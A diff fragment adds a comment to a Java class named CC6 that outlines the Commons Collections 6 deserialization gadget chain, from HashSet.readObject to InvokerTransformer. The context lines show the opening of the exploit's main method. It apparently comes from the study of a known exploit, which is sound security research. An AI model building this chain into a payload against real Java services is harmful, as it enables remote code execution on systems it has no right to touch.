@@ -13,6 +13,15 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
+/*
+* HashSet.readObject()
+*  ->HashMap.hash()
+*   ->TiedMapEntry.hashcode()
+*    ->TiedMapEntry.getValue()
+*     ->LazyMap.get()
+*      ->ChainedTransformer.transform()
+*       ->InvokerTransformer.transform()
+* */
 public class CC6 {
     public static void main(String[] args) throws Exception {
         Transformer[] fakeFormer = new Transformer[]{new ConstantTransformer(1)};
